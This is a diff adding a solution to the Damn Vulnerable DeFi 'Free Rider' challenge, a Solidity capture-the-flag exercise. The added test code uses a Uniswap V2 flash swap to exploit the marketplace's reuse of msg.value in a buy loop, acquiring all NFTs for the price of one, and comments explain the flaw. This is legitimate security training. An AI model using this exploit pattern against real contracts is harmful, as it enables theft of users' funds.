@@ -12,6 +12,8 @@ import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketpl
 import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
 
+import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
+
 contract FreeRiderChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -123,8 +125,60 @@ contract FreeRiderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_freeRider() public checkSolvedByPlayer {
-        
+        // Flash swaps are a built-in feature of Uniswap V2.
+        // (Reference: https://docs.uniswap.org/contracts/v2/reference/smart-contracts/pair#swap-1)
+        // For regular swaps, the `data.length` must be 0.
+        // However, if `data.length` > 0, the `uniswapV2Call()` function is invoked,
+        // passing the `data` parameter back to the caller.
+        uniswapPair.swap(
+            NFT_PRICE,
+            0,
+            address(this),
+            abi.encode(0)
+        );
     }
+
+    // No sender verification here.
+    function uniswapV2Call(address, uint256 amount, uint256, bytes calldata) external {
+        // The external function buyMany() iterates over the given ids, calling
+        // _buyOne().
+        // The internal function _buyOne() checks for msg.value to be equal to or
+        // greater than the price of the NFT.
+        // No other value checks are made besides verifying that the price is not zero.
+        // This creates a loop-based misuse of msg.value, where msg.value is reused
+        // across iterations without being properly discounted.
+        // As a result, an attacker can use the value of the most expensive item to
+        // pass the controls and obtain all the items requested in the transaction.
+        uint256[] memory ids = new uint256[](AMOUNT_OF_NFTS);
+        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
+            ids[i] = i;
+        }
+        marketplace.buyMany{value: NFT_PRICE}(ids);
+
+        // Recovery Manager interaction
+        bytes memory data = abi.encode(address(this));
+        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
+            nft.safeTransferFrom(address(this), address(recoveryManager), i, data);
+        }
+
+        // Repay the flash loan
+        uint256 fee = ((amount * 3) / 997) + 1;
+        weth.deposit{value: fee}();
+        uint256 amountToRepay = amount + fee;
+        weth.transfer(address(uniswapPair), amountToRepay);
+
+        // Send the bounty to the player
+        payable(player).transfer(BOUNTY);
+    }
+
+    // Required by ERC721 for safe transfers to contracts
+    function onERC721Received(address, address, uint256, bytes calldata)
+        external pure returns (bytes4) {
+        return IERC721Receiver.onERC721Received.selector;
+    }
+
+    // Required to receive funds
+    receive() external payable {}
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
